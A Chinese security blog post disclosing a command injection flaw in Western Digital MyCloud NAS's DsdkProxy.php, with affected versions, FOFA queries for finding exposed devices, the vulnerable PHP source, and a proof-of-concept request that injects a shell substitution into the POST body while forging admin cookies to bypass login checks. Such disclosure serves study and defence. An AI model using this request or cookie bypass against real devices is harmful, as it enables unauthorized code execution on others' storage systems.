---
title: "西部数码 NAS DsdkProxy.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-DsdkProxy-rce.html
asset_dir: assets/西部数码-nas-dsdkproxy.php-命令执行漏洞
---

# 西部数码 NAS DsdkProxy.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/7 12:45
- 502浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

代码安全审计

Web安全书籍

安全

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS DsdkProxy.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

漏洞预警服务

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

授权

安全研究工具

Web安全课程

直接看 `DsdkProxy.php` 其业务实现逻辑如下

```
<?php

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */

if (login_check() != 1) {
    http_response_code(401);
    goto __exit;
}

$postOrPutRequest = ($_SERVER['REQUEST_METHOD'] == 'POST' || $_SERVER['REQUEST_METHOD'] == 'PUT');

$curlCommand = 'sudo curl -i -s --unix-socket "/var/run/wdappmgr.sock" -X ';
$curlCommand .= $_SERVER['REQUEST_METHOD'];
$curlCommand .= ' ';

if ($postOrPutRequest) {
    $curlCommand .= ' -d ';
    $curlCommand .= '\'';
    $curlCommand .= file_get_contents('php://input');
    $curlCommand .= '\'';
}

$curlCommand .= ' ';
$curlCommand .= 'http://localhost/';
$curlCommand .= $endpoint;

if (!$postOrPutRequest && $_SERVER['QUERY_STRING'] != null) {
    $curlCommand .= '?';
    $curlCommand .= $_SERVER['QUERY_STRING'];
}
$curlCommand .= ' 2>&1';

$output = shell_exec($curlCommand);

$startPos = strpos($output, ' ');
$httpCode = substr($output, $startPos + 1, 3);
$body = "";

if(($pos = strpos($output, '[')) !== false || ($pos = strpos($output, '{')) !== false) {
   $body = substr($output, $pos);
} else {
   $body = $output;
}

header('Content-Type: application/json');
http_response_code($httpCode);
echo $body;
__exit:
?>
```

当处理 `POST` 或 `PUT` 请求时，它会将请求体内容 (`file_get_contents('php://input')`) 直接插入到 `curl` 命令的 `-d` 参数中，并且仅使用单引号进行包裹。攻击者可以通过在请求体中注入单引号来闭合现有字符串，然后注入任意的 `curl` 参数或 shell 命令，因为最终的命令字符串会被 `shell_exec()` 执行，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞预警服务

# 漏洞复现

```
POST /web/dsdk/DsdkProxy.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

' $(sleep 3) '
```

[![西部数码 NAS DsdkProxy.php 命令执行漏洞](images/img-001-08438a440f58.webp)](https://image.mrxn.net/08f70b5e17814fb18f7fe5a6fe852b99.webp)

成功延时 3 秒

代码安全审计

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

网络安全
